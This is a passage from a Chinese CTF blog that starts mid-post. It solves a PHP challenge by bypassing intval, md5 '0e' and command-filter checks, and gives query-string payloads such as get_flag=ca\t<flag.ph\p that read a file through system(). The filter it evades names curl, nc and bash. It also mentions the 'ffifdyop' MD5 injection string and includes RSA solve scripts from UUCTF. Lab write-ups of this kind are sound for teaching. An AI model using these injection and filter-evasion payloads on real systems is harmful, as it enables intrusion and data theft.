有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;&#x2F;br&gt;&quot;;        system($get_flag);    &#125;else&#123;        die(&quot;快到非洲了&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;?&gt;去非洲吧<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分为三层绕过：</p><p>第一层;</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$numPositve</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$numReverse</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^0-9.]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"非洲欢迎你1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\./"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\-/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\-/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[-]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"没有这样的数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">!=</span> <span class="token variable">$numPositve</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$numPositve</span> <span class="token operator">&lt;=</span> <span class="token operator">-</span><span class="token number">999999999999999999</span> <span class="token operator">||</span> <span class="token variable">$numPositve</span> <span class="token operator">>=</span> <span class="token number">999999999999999999</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//在64位系统中 intval()的上限不是2147483647 省省吧</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"非洲欢迎你2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$numPositve</span> <span class="token operator">===</span> <span class="token variable">$numReverse</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"金钱解决不了穷人的本质问题"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先通过get传参一个变量    num   然后</p><p>$numPositve &#x3D; intval($num);<br>$numReverse &#x3D; intval(strrev($num));</p><p>strrev()函数   实现字符串反转</p><p>最终要实现绕过</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">if( $numPositve &#x3D;&#x3D;&#x3D; $numReverse &amp;&amp; !isPalindrome($num) )<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>numpositve  与   numreverse   强相等   isPalindrome  函数判断num反转后是否与原来相等  </p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">?num&#x3D;100.0010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就绕过了    if( $numPositve &#x3D;&#x3D;&#x3D; $numReverse &amp;&amp; !isPalindrome($num) )   但是   发现没有绕过  $num !&#x3D; $numPositve               num 是一个字符串    而  numpositive  是一个数字</p><p>可以发现，这里使用了不严格判断，也就是俩等号，这样的话就可以使用浮点精度来绕过</p><p><img src="/2023/02/02/md5%E7%BB%95%E8%BF%87/1662023542462.png" alt="1662023542462"></p><p>所以可以构造一个   精度更长的浮点数来进行绕过</p><pre class="line-numbers language-none"><code class="language-none">?num&#x3D;1000000000000000.00000000000000010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就实现了绕过</p><p>第二层：</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">if (isset($_GET[&#39;md5&#39;]))&#123;    $md5&#x3D;$_GET[&#39;md5&#39;];    if ($md5&#x3D;&#x3D;md5(md5($md5)))        echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;&#x2F;br&gt;&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>首先通过get传参   传入 md5参数    然后md5这个变量经过   md5两次加密后的值与原来相等  </p><p>$md5&#x3D;&#x3D;md5(md5($md5))</p><p>跑脚本得出一个</p><p>0e1138100474</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">?num&#x3D;1000000000000000.00000000000000010&amp;md5&#x3D;0e1138100474<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>实现第二层绕过</p><p>第三层</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">if (isset($_GET[&#39;get_flag&#39;]))&#123;    $get_flag &#x3D; $_GET[&#39;get_flag&#39;];    if(!strstr($get_flag,&quot; &quot;))&#123;        $get_flag &#x3D; str_ireplace(&quot;cat&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;more&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;tail&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;less&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;head&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;tac&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;sort&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;nl&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;$&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;curl&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;bash&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;nc&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;php&quot;, &quot;36dCTFShow&quot;, $get_flag);        if (preg_match(&quot;&#x2F;[&#39;\*\&quot;[?]&#x2F;&quot;, $get_flag)) &#123;            die(&#39;非预期修复*2&#39;);        &#125;        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;&#x2F;br&gt;&quot;;        system($get_flag);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由最后一行   system可得最后应该也是通过   远程命令执行  来实现绕过</p><p>发现好多东西都被过滤掉了   可以尝试用    \    尝试绕过</p><pre class="line-numbers language-none"><code class="language-none">?num&#x3D;1000000000000000.00000000000000010&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\t flag.ph\p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现不行   可能是空格也被过滤了</p><pre class="line-numbers language-none"><code class="language-none">?num&#x3D;1000000000000000.00000000000000010&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\t&lt;flag.ph\p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就实现了绕过</p><h1 id="6-MD5-true参数漏洞"><a href="#6-MD5-true参数漏洞" class="headerlink" title="6.MD5()true参数漏洞"></a>6.MD5()true参数漏洞</h1><p>ffifdyop字符串会造成漏洞</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> md5绕过 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> md5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022UUCTF</title>
      <link href="/2023/02/01/UUCTF/"/>
      <url>/2023/02/01/UUCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="unsafe-prime"><a href="#unsafe-prime" class="headerlink" title="unsafe_prime"></a>unsafe_prime</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># from Crypto.Util.number import *</span><span class="token comment"># from flag import flag</span><span class="token comment"># import libnum</span><span class="token comment"># p=getPrime(1024)</span><span class="token comment"># n=p**3</span><span class="token comment"># e=65537</span><span class="token comment"># c=pow(libnum.s2n(flag),e,n)</span><span class="token comment"># print(n)</span><span class="token comment"># print(c)</span><span class="token comment">#1781066779141074297846071955037887396311182371062305797790413639302252321886055189043670187843106208315282055227397316083218930657040969292641990094428330517286511511741846106485971830443788363541411679523274683568732340113625424593194464460018629545968907529693143364870519531630721083893407011154181539445417439610805148961135948617691115328261432541033785402520757881586489819563221498111411690769065511011083021336493731421274742041131952523427183184133413677315203810963447656037908287875212013900845740870561508870574734100843624059414134156975073835607712519402938132401964708681236647568922173471703538744207491065165405594141287750705055447493380970194312139898574699147098202027540057477562090764694370368571887563631557761911842054442637038169316686266784299889397326811768646649462480349219937292894824766045607723468654723947999531346474969019631500665628522355198334827965770037487344994396753505248472283247731</span><span class="token comment">#1402371150275079475353867962992356093684205278224746766691813462864343871795075217989508355749642716635931824907174189358797217546624305634264458802157933311315419673854405865092102322247505412453586251582022669511221048298234732642016439123525455296325766292112758881774720932499142635136210314142144509741404827421282969081272484330382868174392651681290127032351489627054643864671335712011990584326951285867375878235135547391155357814807654366986019707719726796289990920154227959213228064918435259919697047405788311280560319520593639968900649500117511665741073545430999580686455996145426173603547052710181735901020361145546892741579951501409108067297139928103329203429485237575169217432586580425019729120741661192297552519858305628835738911159460615968385837687234565509200392302553443089729906970894661310333276852803980265040679214814192141779678148895736682538612828771031493541256243879854624644771924477873876038496224</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnum<span class="token keyword">import</span> sympye <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">1781066779141074297846071955037887396311182371062305797790413639302252321886055189043670187843106208315282055227397316083218930657040969292641990094428330517286511511741846106485971830443788363541411679523274683568732340113625424593194464460018629545968907529693143364870519531630721083893407011154181539445417439610805148961135948617691115328261432541033785402520757881586489819563221498111411690769065511011083021336493731421274742041131952523427183184133413677315203810963447656037908287875212013900845740870561508870574734100843624059414134156975073835607712519402938132401964708681236647568922173471703538744207491065165405594141287750705055447493380970194312139898574699147098202027540057477562090764694370368571887563631557761911842054442637038169316686266784299889397326811768646649462480349219937292894824766045607723468654723947999531346474969019631500665628522355198334827965770037487344994396753505248472283247731</span>c <span class="token operator">=</span> <span class="token number">1402371150275079475353867962992356093684205278224746766691813462864343871795075217989508355749642716635931824907174189358797217546624305634264458802157933311315419673854405865092102322247505412453586251582022669511221048298234732642016439123525455296325766292112758881774720932499142635136210314142144509741404827421282969081272484330382868174392651681290127032351489627054643864671335712011990584326951285867375878235135547391155357814807654366986019707719726796289990920154227959213228064918435259919697047405788311280560319520593639968900649500117511665741073545430999580686455996145426173603547052710181735901020361145546892741579951501409108067297139928103329203429485237575169217432586580425019729120741661192297552519858305628835738911159460615968385837687234565509200392302553443089729906970894661310333276852803980265040679214814192141779678148895736682538612828771031493541256243879854624644771924477873876038496224</span>p <span class="token operator">=</span> <span class="token number">121216033233585299462279856144422199686140149244819402908675131452249143435823157035320400025743305736047792084067723177554239638229731651194515823556880874798950035236056266154727789682357822323822962110560589110432270068487448525123808163818606838762211746373156874518622834972063360072190758655502892772811</span>q <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>phi <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>d <span class="token operator">=</span> libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'flag&#123;Shumu_th1nk_saf3_pr1me_ar3_importanT!&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Impossible-RSA"><a href="#Impossible-RSA" class="headerlink" title="Impossible_RSA"></a>Impossible_RSA</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># import libnum</span><span class="token comment"># from Crypto.Util.number import getPrime</span><span class="token comment"># from flag import flag, e</span><span class="token comment">#</span><span class="token comment"># p = getPrime(1024)</span><span class="token comment"># q = getPrime(1024)</span><span class="token comment"># n = p * q</span><span class="token comment"># assert e &lt;= 500000</span><span class="token comment"># c = pow(libnum.s2n(flag), e, n)</span><span class="token comment"># leak1 = c % q</span><span class="token comment"># leak2 = c % p</span><span class="token comment"># leak3 = p + q</span><span class="token comment"># print("n =", n)</span><span class="token comment"># print("leak1 =", leak1)</span><span class="token comment"># print("leak2 =", leak2)</span><span class="token comment"># print("leak3 =", leak3)</span><span class="token comment">#求p,q</span><span class="token comment"># import sympy</span><span class="token comment"># n = 21256406304024147327122699985764737895162788854942201173538004689536569610046157311527715126074775927977409773971656249943602454790380966869525211733301201659688694473703188427037879868522859419364680904585572399937639393418586498509580133474303442722716959873727260844993296681950092753897902540593927952622713860163782763263944291810729056735965535138964485886748344167499818148134252327820007439830749462775149754781930983094046362696040641091039506998835624218220892441813224657845627120344960554424765109502415773475619490661527184126374299883610442465428985757004551740482644952396990065188807827114495184096249</span><span class="token comment"># leak1 = 8842431959638543756327530752221031675897458993985909403335303147413741167900365489182674478419510549838159493192002672500346433589707076289344572454304647803237654059883974235710442126617587691632375039292283285577033977676131772115877520248352227419433136507412485140428972344000541898060766721412300525883</span><span class="token comment"># leak2 = 127414092867622693231378230621806169422569654246682818498761930473755998913688181327473434110121174292309611256339271412324673262030535400937563769685033472683498585742711576446343086462569783541192470920638935990937187809422965809986860709074542257475025562691683977493260026623616012846939417988284096473040</span><span class="token comment"># leak3 = 293130152177150437492580785085598394773458388719469800871702200331766258900690595210759869625006484354799804558552583572062231998451041105464048317708732987121458633718573774164071597186461239762511364549980544029915308083867329707804739776241438307060614946195675715671343671137725809499387682363101164970886</span><span class="token comment">#</span><span class="token comment"># p = sympy.Symbol('p')#方程组定义变量</span><span class="token comment"># q = sympy.Symbol('q')</span><span class="token comment"># m1 = p + q - leak3</span><span class="token comment"># m2 = p*q - n</span><span class="token comment"># result = sympy.solve([m2,m1],[q,p])</span><span class="token comment"># p = result[1][0]</span><span class="token comment"># q = result[1][1]</span><span class="token comment"># print(p+q)</span><span class="token comment"># print(p)</span><span class="token comment"># print(q)</span><span class="token comment">#求c</span><span class="token comment"># import gmpy2</span><span class="token comment"># import functools</span><span class="token comment"># leak1 = 8842431959638543756327530752221031675897458993985909403335303147413741167900365489182674478419510549838159493192002672500346433589707076289344572454304647803237654059883974235710442126617587691632375039292283285577033977676131772115877520248352227419433136507412485140428972344000541898060766721412300525883</span><span class="token comment"># leak2 = 127414092867622693231378230621806169422569654246682818498761930473755998913688181327473434110121174292309611256339271412324673262030535400937563769685033472683498585742711576446343086462569783541192470920638935990937187809422965809986860709074542257475025562691683977493260026623616012846939417988284096473040</span><span class="token comment"># p = 161562249983202700035527081166558786031731223261198195999535987465827171883730733359944156020947215855022510635343983292897557354440470230745496731228302894376018866016596714241754815953745113727125200716224341010140868299262202025976056483744622119807303134689795661748036502596285135565503272596613700276343</span><span class="token comment"># q = 131567902193947737457053703919039608741727165458271604872166212865939087016959861850815713604059268499777293923208600279164674644010570874718551586480430092745439767701977059922316781232716126035386163833756203019774439784605127681828683292496816187253311811505880053923307168541440673933884409766487464694543</span><span class="token comment"># def CRT(mi, ai):</span><span class="token comment">#     # mi,ai分别表示模数和取模后的值,都为列表结构</span><span class="token comment">#     # Chinese Remainder Theorem</span><span class="token comment">#     assert (isinstance(mi, list) and isinstance(ai, list))</span><span class="token comment">#     M = functools.reduce(lambda x, y: x * y, mi)</span><span class="token comment">#     ai_ti_Mi = [a * (M // m) * gmpy2.invert(M // m, m) for (m, a) in zip(mi, ai)]</span><span class="token comment">#     return functools.reduce(lambda x, y: x + y, ai_ti_Mi) % M</span><span class="token comment"># print(CRT([p,q],[leak2,leak1]))</span><span class="token comment"># #</span><span class="token comment">#</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnume <span class="token operator">=</span> <span class="token number">49333</span><span class="token comment"># c = 17431785835448961043859261315176288401566897635242802779223179191586051568502129723405988597934098406136452124086691395820535287880399796936679536014864454358414280944146420090803301734567846096671469665943122284125460393629919656472016204629268365464527631452362135617958549984167918731877279978373216172745252114501071952316225108779903786223880900111253475978779987190816907059958151040417717948214119214022275866036117533690908516698257151038714990849359728367630245354088623657069197243123992414029445546670792061100574970848370880757736957657188088000537248398978275307423124105368394831768224360130420560928591</span><span class="token comment"># c = 22770122824321633115912971825455908687355382455045454571705704690952291322481511160730887869058862732082938259964873518549282801291480023621164456866675823033615112134707695914501857504810427675491749515262338634897770912428069575542658585834016589453429998202472108150395872255742766808098607542366119238049827700517324253555848273103545741173860889988033732803979471867442572549436584137491914091815352759870752703050324084234064754734337560733929308712765145094917275935838039936048676125768788180346996240649957625553766984801712082446523595467203047833266290134224103170539631882579941524894829078335447533983</span>c <span class="token operator">=</span> <span class="token number">3824620468575186283263438670588449493595891219699398394314825497950518041544027588121726528140677521840957649884964854123067166909981169932845675718436747301274413529556768336234578133955013322693211238642450115812178999788666842037563928845035077258189328421365125227034746697782174022020622562220711779877598002187538072184706888792199297713183102140951678635870454210304080828257689834218945600205170933595021659495344723487962865693403732529551424491615233971077383327527196551458483405810155511628144408791554931651558741600255400950740080455745248949786196057225372895693209845996211788165583651693771020166581</span>n <span class="token operator">=</span> <span class="token number">21256406304024147327122699985764737895162788854942201173538004689536569610046157311527715126074775927977409773971656249943602454790380966869525211733301201659688694473703188427037879868522859419364680904585572399937639393418586498509580133474303442722716959873727260844993296681950092753897902540593927952622713860163782763263944291810729056735965535138964485886748344167499818148134252327820007439830749462775149754781930983094046362696040641091039506998835624218220892441813224657845627120344960554424765109502415773475619490661527184126374299883610442465428985757004551740482644952396990065188807827114495184096249</span>p <span class="token operator">=</span> <span class="token number">161562249983202700035527081166558786031731223261198195999535987465827171883730733359944156020947215855022510635343983292897557354440470230745496731228302894376018866016596714241754815953745113727125200716224341010140868299262202025976056483744622119807303134689795661748036502596285135565503272596613700276343</span>q <span class="token operator">=</span> <span class="token number">131567902193947737457053703919039608741727165458271604872166212865939087016959861850815713604059268499777293923208600279164674644010570874718551586480430092745439767701977059922316781232716126035386163833756203019774439784605127681828683292496816187253311811505880053923307168541440673933884409766487464694543</span><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token operator">*</span>q<span class="token punctuation">)</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'flag&#123;c59d5fc3-610c-41ca-baef-b26f9a88648d&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="disparity-rsa"><a href="#disparity-rsa" class="headerlink" title="disparity_rsa"></a>disparity_rsa</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># from Crypto.Util.number import *</span><span class="token comment"># import libnum</span><span class="token comment"># from flag import flag</span><span class="token comment">#</span><span class="token comment"># n = getPrime(16) * getPrime(1024)</span><span class="token comment"># e = 65537</span><span class="token comment"># c = pow(libnum.s2n(flag), e, n)</span><span class="token comment"># print(n)</span><span class="token comment"># print(c)</span><span class="token triple-quoted-string string">"""57662763923587496784652931400860984679667502317123713121283570143919997372160387522307242843425928231213558237958664832031809310489543351127707741075594867553642122104589761513347226954921714770747978490179861462740774768659620847755229038565952312264010873811402640698463113207903449776818535903202352732909516972045715881946911272235143200802867525029545408884378407157206152052553006168468197781701884100551265225998396305370344041310549543210998337911706435156837312343915033047602409702498958543942876869008345155456133353563984395357862622021564371486943574405858053628504628093173853945529577974028398631861979247502108s"""</span><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnume <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">5766276392358749678465293140086098467966750231712371312128357014391999737216038752230724284342592823121355823795866483203180931048954335112770774107559486755364212210458976151334722695492171477074797849017986146274077476865962084775522903856595231226401087381140264069846311320790344977681853590320235273290951697</span>c <span class="token operator">=</span> <span class="token number">2045715881946911272235143200802867525029545408884378407157206152052553006168468197781701884100551265225998396305370344041310549543210998337911706435156837312343915033047602409702498958543942876869008345155456133353563984395357862622021564371486943574405858053628504628093173853945529577974028398631861979247502108</span>p <span class="token operator">=</span> <span class="token number">100824891894856702601201118009583648965164977561371042858637845367138181483380929730739526924561431398670347148954669147299066829552802628259180187574259704417901631558444093499584247442642574479809722666468258052387219612630695122930581802321960294913554359621973108878080665153439264529066699136581547328967</span>q <span class="token operator">=</span> <span class="token number">57191</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="爱丽丝梦境的兔子"><a href="#爱丽丝梦境的兔子" class="headerlink" title="爱丽丝梦境的兔子"></a>爱丽丝梦境的兔子</h1><p>题目描述</p><p>一只没有钥匙的兔子背着社会主义核心价值观跳过6排栅栏</p><pre class="line-numbers language-none"><code class="language-none">U2FsdGVkX19ixL7s5HryOhyL5oSScYGNVBVWl+sUMYQwTRniXreqeSp&#x2F;iTHtkcxtqicNL4xpHc5X34Daat7ixqkZMpU4JV9USOKKTAw9HJfGnoDzFF&#x2F;JY0gzJpxgmW1X4nXktQ4J7OM14EMcTrhPDIOfG2VDJr4yViWc&#x2F;vNS8np1IFeIRXMoWGAJHuI8IOVGtXi2JX6hTseYkJc2LGHJkLQ0WDW67RyhPC3vOwmJHOs&#x2F;wMefWCaYteoQYOCReltmFYuuibegOvFSUl1f0Tu7488mBHNjTrDSC76HjgxJJ6h9P36mLucQUBiFMyjLe0k1+TTb39iMaGCuPiDb0UoAcAZPolz7RCeXqZOdzcJsPIFK&#x2F;tcFLGeOPJTfFhJiwga6cENO7pqeIB1qsRqEjyO4m4wgkhugdcs10CCevOJxNiQaWtv&#x2F;FIOw9oCi5Q0VP+C9qXZbuQ&#x3D;&#x3D;<span aria-hidden="true" 